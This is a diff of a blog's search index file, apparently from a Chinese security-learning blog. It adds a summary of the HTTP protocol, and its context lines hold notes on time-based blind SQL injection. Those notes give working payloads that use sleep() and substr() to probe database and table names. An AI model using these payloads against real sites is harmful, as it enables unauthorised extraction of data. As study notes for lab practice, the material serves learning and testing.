@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[HTTP协议]]></title>
+    <url>%2F2018%2F10%2F27%2Fhttp%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%2F</url>
+    <content type="text"><![CDATA[HTTP协议HTTP–Hyper Text Transfer Protocol(超文本传输协议)，是用于从互联网服务器传输超文本到本地浏览器的传输协议。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML文件、图片、查询结果等）。 HTTP工作原理HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。 Web服务器有：Apache服务器，iis服务器等。Web服务器根据接收到的请求后，向客户端发送响应信息。HTTP默认端口号为80，但是你可以改为8080或其他端口号。HTTP三点注意事项： HTTP是无连接：无连接的含义是限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式节省传输时间。 HTTP是媒体独立的：这意味着，只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。 HTTP是无状态：HTTP协议是无状态协议。无状态是指协议对事务处理没有记忆功能。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。 转载至菜鸟教程-HTTP简介]]></content>
+      <tags>
+        <tag>HTTP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[sql时间盲注]]></title>
     <url>%2F2018%2F10%2F25%2Fsql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
     <content type="text"><![CDATA[sql基于时间的盲注知识点1.时间检测盲注使用的函数 检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+ 3.检测表名检测表名长度 1and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)&gt;5),sleep(5),1)--+ 检测表名 1and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)=&apos;a&apos;,sleep(5),1)--+]]></content>
